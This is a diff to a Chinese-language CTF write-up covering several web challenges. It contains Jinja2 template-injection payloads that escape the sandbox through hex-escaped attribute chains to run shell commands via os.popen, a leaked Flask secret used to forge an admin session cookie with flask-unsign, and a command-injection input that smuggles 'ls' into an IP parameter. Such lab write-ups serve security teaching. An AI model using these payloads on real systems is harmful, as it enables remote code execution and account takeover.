@@ -279,9 +279,24 @@ bp抓包发请求。
 
 
 ## xweb8
-eyJ1c2VybmFtZSI6eyIgYiI6IlozVmxjM1E9In19.XujrrQ.xoAx5K_C3G02upLFocfEAgH2KUg
+提示 name is None,  其实name是个参数。
 
-{"username":{" b":"Z3Vlc3Q="}}
+    /?name=123 # 输出了123
+    /?name={{config}}
+
+得到 secret_key: woshicaiji
+
+pip install flask-unsign
+
+    flask-unsign --sign --cookie "{'username':'admin'}" --secret "woshicaiji"
+    得到  eyJ1c2VybmFtZSI6ImFkbWluIn0.Xu4O0g.XJfjTax5RNgPPOGF82S2ZXOdTmQ
+
+访问/flag，用bp抓包修改session值为新的token
+
+flag
+
+    xmctf{f8e74d4b1b3fcd479f9b2a6a9ef935e0} 
+
 ## xweb6
 
 2019巅峰极客upload
@@ -302,6 +317,76 @@ http://xmctf.top:8841/file.php?file=ph\ar:///var/www/html/upload/0412c29576c708c
 ?file=phar:///var/www/html/upload/0412c29576c708cf0155e8de242169b1.jpg
 ?file=phar:///upload/0412c29576c708cf0155e8de242169b1.jpg
 
+## web11
+Hello guest!
+
+?name={{4*4}}
+
+有结果，ssti注入
+
+测试过滤了 `['.', '_', 'config']`
+
+
+bytearray.fromhex(hex(0x4142)[2:])
+
+```python
+默认参考payload
+/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("cat /app/flag").read()}}
+
+302是popen.本题过滤了[._] 使用16进制 \x5f绕过_ , \x2e绕过.
+
+\x5f\x5fbase\x5f\x5f => __base__
+.调用使用[]绕过 ()["\x5f\x5fclass\x5f\x5f"] => ().__class__
+```
+先ls查找下flag。
+```python
+http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("ls")["read"]()}}
+http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("ls /")["read"]()}}
+```
+当前目录发现app.py， 在根目录发现了fl4g
+
+```python
+http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("cat app\x2epy")["read"]()}}
+方法1分段读
+http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("cat /fl4g")["read"]()[:3]}}
+http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("cat /fl4g")["read"]()[3:]}}
+方法2替换flag为xxyy进行显示
+http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("cat /fl4g")["read"]()["replace"]("flag", "xxyy")}}
+http://xmctf.top:8857/?name={{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[402]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("cat app\x2epy")["read"]()["replace"]("flag", "xxyy")}}
+```
+提示flag在回血中，不会被显示。分段读一下即可。
+
+
+`flag{12sd-jt4esf3-s93hcecc3-s33ff3}`
+
+顺便下载app.py
+```python
+Hello from flask import Flask, request,render_template_string,redirect,render_template
+app = Flask(__name__)
+app.config['SECRET_KEY']='t9whf97yvvwn7y7w4twbv2640vyn0wt2v'
+
+
+@app.route("/",methods=["GET","POST"])
+def index():
+    name = request.args.get('name', 'guest')
+    if '_' in name or '.' in name or 'config' in name or 'args' in name:
+        return render_template("hack.html")
+    t = "Hello {}!".format(name)
+    if "flag" in render_template_string(t): # just a trick:
+        return "'flag' in result !!!Bighack"
+    else:
+        return render_template_string(t)
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0')!
+```
+
+
+## RCE-训练
+?ip=%7c ls%0a127.0.0.1
+https://0day.design/2018/12/20/Swpu%20CTF%202018%20Writeup/
+
+https://www.google.com/search?q=preg_match(%22%2F.*f.*l.*a.*g.*%2F%22&oq=preg_match(%22%2F.*f.*l.*a.*g.*%2F%22&aqs=chrome..69i57&sourceid=chrome&ie=UTF-8
 
 ## xweb5
 method=logout
@@ -309,5 +394,4 @@ method=logout
 
 ## 打不开
 whoami-考核 
-web11
 web7
